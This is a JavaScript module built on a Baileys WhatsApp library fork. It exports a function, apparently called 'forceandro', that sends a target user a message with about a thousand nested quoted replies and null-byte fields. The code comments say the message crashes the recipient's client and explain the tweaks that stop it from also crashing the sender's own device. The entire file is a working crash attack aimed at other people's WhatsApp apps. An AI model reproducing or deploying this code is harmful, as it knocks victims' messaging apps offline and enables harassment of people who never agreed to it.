const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    encodeSignedDeviceIdentity,
    processTime,
    fetchLatestBaileysVersion,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function forceandro(sock, target) {
    if (!sock || !target) {
        console.log('[forceandro] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // Never let the paired number target itself.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[forceandro] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    const xqtd = (xvnx) => {
        let q = {
            conversation: "tredict"
        };

        for (let i = 0; i < xvnx; i++) {
            q = {
                extendedTextMessage: {
                    text: "\0",
                    contextInfo: {
                        quotedMessage: q
                    }
                }
            };
        }

        return q;
    };

    const message = {
        extendedTextMessage: {
            text: "\0",
            contextInfo: {
                stanzaId: Math.random().toString(36).slice(2),
                remoteJid: "\0",
                quotedMessage: {
                    extendedTextMessage: {
                        text: "\0",
                        contextInfo: {
                            quotedMessage: xqtd(1000)
                        }
                    }
                }
            }
        }
    };

    try {
        // FIX: direct relay to target instead of status@broadcast.
        // status@broadcast was serving the payload back into the sender's OWN status feed,
        // which is why the paired number was getting the crash too.
        await sock.relayMessage(
            target,
            message,
            {
                messageId: Math.random().toString(36).slice(2) + crypto.randomBytes(4).toString('hex'),
                // exact casing — sender-side mirror stop
                noSelfSync: true,
                // extra device-side suppression
                additionalAttributes: {
                    'device_fanout': 'false'
                },
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: []
                                    }
                                ]
                            }
                        ]
                    }
                ]
            }
        );
    } catch (e) {
        console.log('[forceandro]', (e && e.message) ? e.message : e);
    }
}

module.exports = { forceandro };
